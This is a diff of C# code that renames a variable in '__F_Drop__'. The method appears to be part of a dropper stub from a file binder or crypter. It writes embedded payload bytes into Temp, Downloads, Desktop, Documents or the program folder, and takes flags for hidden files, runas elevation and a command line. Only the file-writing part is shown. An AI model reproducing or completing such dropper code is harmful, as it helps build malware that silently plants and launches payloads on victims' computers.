@@ -167,29 +167,29 @@ class __Program__
 
 	static void __F_Drop__(string __f1_name__, bool __f1_hidden__, int __f1_dropLocation__, int __f1_dropAction__, bool __f1_runas__, string __f1_commandLine__, byte[] __f1_data__)
 	{
-		string dropLocation;
+		string path;
 		switch (__f1_dropLocation__)
 		{
 			case 1:
-				dropLocation = Path.GetTempPath();
+				path = Path.GetTempPath();
 				break;
 			case 2:
-				dropLocation = Registry.GetValue(/**/"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders", /**/"{374DE290-123F-4565-9164-39C4925E467B}", null) as string;
+				path = Registry.GetValue(/**/"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders", /**/"{374DE290-123F-4565-9164-39C4925E467B}", null) as string;
 				break;
 			case 3:
-				dropLocation = Environment.GetFolderPath(System.Environment.SpecialFolder.DesktopDirectory);
+				path = Environment.GetFolderPath(System.Environment.SpecialFolder.DesktopDirectory);
 				break;
 			case 4:
-				dropLocation = Environment.GetFolderPath(System.Environment.SpecialFolder.MyDocuments);
+				path = Environment.GetFolderPath(System.Environment.SpecialFolder.MyDocuments);
 				break;
 			case 5:
-				dropLocation = AppDomain.CurrentDomain.BaseDirectory;
+				path = AppDomain.CurrentDomain.BaseDirectory;
 				break;
 			default:
 				return;
 		}
 
-		__f1_name__ = Path.Combine(dropLocation, __f1_name__);
+		__f1_name__ = Path.Combine(path, __f1_name__);
 
 		File.Delete(__f1_name__);
 		File.WriteAllBytes(__f1_name__, __f1_data__);
